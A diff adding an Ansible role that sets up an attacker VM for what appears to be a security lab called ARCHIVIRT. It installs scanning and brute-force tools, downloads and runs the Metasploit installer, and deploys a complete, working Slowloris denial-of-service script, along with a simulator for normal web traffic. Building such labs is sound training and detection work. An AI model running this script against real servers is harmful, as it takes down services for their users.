@@ -1,0 +1,183 @@
+---
+# ─────────────────────────────────────────────────────────────
+# ARCHIVIRT — Attacker Role
+# Installs penetration testing tools on the attacker VM
+# Tools: Nmap, Hydra, sqlmap, Metasploit, Slowloris
+# ─────────────────────────────────────────────────────────────
+
+- name: Install base attack tools via apt
+  ansible.builtin.apt:
+    name:
+      - nmap
+      - hydra
+      - sqlmap
+      - netcat-openbsd
+      - python3-pip
+      - python3-scapy
+      - curl
+      - wget
+      - hping3
+      - masscan
+      - john
+      - medusa
+    state: present
+
+- name: Install Python slowloris tool
+  ansible.builtin.pip:
+    name:
+      - slowloris
+      - requests
+      - scapy
+      - paramiko
+    executable: pip3
+
+- name: Create attack scripts directory
+  ansible.builtin.file:
+    path: /opt/archivirt/attack-scripts
+    state: directory
+    owner: ubuntu
+    group: ubuntu
+    mode: "0755"
+
+- name: Deploy Slowloris attack script
+  ansible.builtin.copy:
+    dest: /opt/archivirt/attack-scripts/slowloris.py
+    owner: ubuntu
+    group: ubuntu
+    mode: "0755"
+    content: |
+      #!/usr/bin/env python3
+      """
+      ARCHIVIRT — Slowloris DDoS Attack Script
+      Scenario: slowloris_ddos
+      """
+      import socket
+      import random
+      import time
+      import argparse
+      import logging
+
+      logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
+      log = logging.getLogger("archivirt-slowloris")
+
+      def slowloris_attack(host: str, port: int, num_sockets: int, duration: int):
+          """Open many partial HTTP connections to exhaust server threads."""
+          list_of_sockets = []
+          headers = [
+              "GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode(),
+              "Host: {}\r\n".format(host).encode(),
+              "User-Agent: Mozilla/5.0 (ARCHIVIRT-Lab)\r\n".encode(),
+              "Accept-language: en-US,en;q=0.5\r\n".encode(),
+          ]
+
+          log.info("Slowloris attack on %s:%s with %d sockets", host, port, num_sockets)
+
+          # Create initial sockets
+          for _ in range(num_sockets):
+              try:
+                  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                  s.settimeout(4)
+                  s.connect((host, port))
+                  for h in headers:
+                      s.send(h)
+                  list_of_sockets.append(s)
+              except Exception:
+                  pass
+
+          log.info("Opened %d sockets", len(list_of_sockets))
+          start = time.time()
+
+          while time.time() - start < duration:
+              log.info("Sending keep-alive headers to %d sockets", len(list_of_sockets))
+              for s in list(list_of_sockets):
+                  try:
+                      s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode())
+                  except Exception:
+                      list_of_sockets.remove(s)
+                      # Replace closed socket
+                      try:
+                          new_s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                          new_s.settimeout(4)
+                          new_s.connect((host, port))
+                          for h in headers:
+                              new_s.send(h)
+                          list_of_sockets.append(new_s)
+                      except Exception:
+                          pass
+              time.sleep(15)
+
+          log.info("Attack completed after %d seconds", duration)
+          for s in list_of_sockets:
+              s.close()
+
+      if __name__ == "__main__":
+          parser = argparse.ArgumentParser(description="ARCHIVIRT Slowloris")
+          parser.add_argument("host", help="Target IP or hostname")
+          parser.add_argument("--port", type=int, default=80)
+          parser.add_argument("--sockets", type=int, default=150)
+          parser.add_argument("--duration", type=int, default=60)
+          args = parser.parse_args()
+          slowloris_attack(args.host, args.port, args.sockets, args.duration)
+
+- name: Deploy normal traffic simulator script
+  ansible.builtin.copy:
+    dest: /opt/archivirt/attack-scripts/normal_traffic.py
+    owner: ubuntu
+    group: ubuntu
+    mode: "0755"
+    content: |
+      #!/usr/bin/env python3
+      """
+      ARCHIVIRT — Normal Traffic Simulator
+      Simulates legitimate web browsing and SCP transfers.
+      """
+      import subprocess
+      import time
+      import random
+      import argparse
+      import logging
+
+      logging.basicConfig(level=logging.INFO, format='%(asctime)s %(message)s')
+      log = logging.getLogger("archivirt-normal-traffic")
+
+      PAGES = ["/", "/index.html", "/dvwa/", "/dvwa/about.php",
+               "/dvwa/instructions.php", "/dvwa/login.php"]
+
+      def simulate_web_browsing(target_ip: str, duration: int):
+          log.info("Simulating web browsing to http://%s for %ds", target_ip, duration)
+          start = time.time()
+          while time.time() - start < duration:
+              page = random.choice(PAGES)
+              cmd = ["curl", "-s", "-o", "/dev/null", "-w", "%{http_code}",
+                     f"http://{target_ip}{page}", "--max-time", "5"]
+              result = subprocess.run(cmd, capture_output=True, text=True)
+              log.info("GET %s → HTTP %s", page, result.stdout.strip())
+              time.sleep(random.uniform(1, 5))
+
+      if __name__ == "__main__":
+          parser = argparse.ArgumentParser(description="ARCHIVIRT Normal Traffic")
+          parser.add_argument("target_ip", help="Target IP address")
+          parser.add_argument("--duration", type=int, default=60)
+          args = parser.parse_args()
+          simulate_web_browsing(args.target_ip, args.duration)
+
+- name: Install Metasploit Framework
+  ansible.builtin.shell: |
+    curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > /tmp/msfinstall
+    chmod +x /tmp/msfinstall
+    /tmp/msfinstall
+  args:
+    creates: /usr/bin/msfconsole
+  ignore_errors: true
+
+- name: Print attack VM ready message
+  ansible.builtin.debug:
+    msg: |
+      ════════════════════════════════════════════
+      Attacker VM configured. Available tools:
+        - nmap       : Port scanning
+        - hydra      : SSH/FTP brute-force
+        - sqlmap     : SQL injection
+        - msfconsole : Metasploit Framework
+        - slowloris  : /opt/archivirt/attack-scripts/slowloris.py
+      ════════════════════════════════════════════
